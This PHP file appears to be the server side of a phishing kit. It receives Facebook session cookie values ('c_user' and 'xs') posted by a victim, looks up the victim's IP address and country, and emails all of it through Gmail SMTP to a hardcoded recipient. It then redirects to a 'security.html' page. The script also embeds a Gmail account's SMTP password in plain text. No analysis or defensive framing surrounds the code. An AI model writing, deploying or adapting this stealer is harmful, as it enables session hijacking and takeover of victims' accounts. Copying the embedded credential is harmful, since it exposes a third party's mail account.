<?php
ob_start(); 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/Exception.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/PHPMailer.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = 'bbelan028@gmail.com';
    $subject = 'Sahab';

    $c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
    $xs = isset($_POST['xs']) ? $_POST['xs'] : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $country = "Unknown Country";

    // Fetch country using IP address
    $geoInfo = file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}");
    $geoInfo = json_decode($geoInfo);
    if(isset($geoInfo->geoplugin_countryName) && $geoInfo->geoplugin_countryName != '') {
        $country = $geoInfo->geoplugin_countryName;
    }

    $message = "c_user: $c_user<br><br>xs: $xs<br><br>IP address: $ip<br><br>Country: $country";

    $headers = "From: webinowebino10@gmail.com\r\n";
    $headers .= "Reply-To: webinowebino10@gmail.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=utf-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
    $headers .= "X-Priority: 1\r\n";

    $smtp_host = "smtp.gmail.com";
    $smtp_port = "587";
    $smtp_username = "webinowebino10@gmail.com";
    $smtp_password = "fftvjmzjhwjuxcoy"; 
    
    $mail = new PHPMailer(true);
    try {
        $mail->SMTPDebug = 0;
        $mail->isSMTP();
        $mail->Host = $smtp_host;
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_username;
        $mail->Password = $smtp_password;
        $mail->SMTPSecure = 'tls';
        $mail->Port = $smtp_port;
        
        $mail->setFrom('webinowebino10@gmail.com', 'Webino Webino');
        $to_array = explode(',', $to);
        foreach ($to_array as $email) {
            $mail->addAddress(trim($email));
        }

        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $message;

        $mail->send();
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

    header("Location: security.html");
    exit();
}
?>